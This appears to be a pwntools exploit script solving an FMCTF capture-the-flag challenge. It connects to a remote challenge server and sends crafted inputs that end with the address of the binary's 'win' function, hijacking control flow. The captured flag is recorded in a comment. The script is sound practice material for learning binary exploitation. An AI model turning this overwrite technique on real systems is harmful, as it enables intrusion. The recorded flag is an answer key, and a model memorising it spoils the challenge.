#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("164.92.176.247", 5002)

for i in range(7):
    seen_addr = u64(elf.read(elf.sym["seens"] + (i*8), 8))
    p.sendlineafter(b"Enter a Seen: ", elf.read(seen_addr, 0x28) + p64(elf.sym["win"]))

p.readuntil(b"{")

print("FMCTF" + p.readuntil(b"}").decode()) # FMCTF{db8aa102093c65b674a0c216dac7cd73}
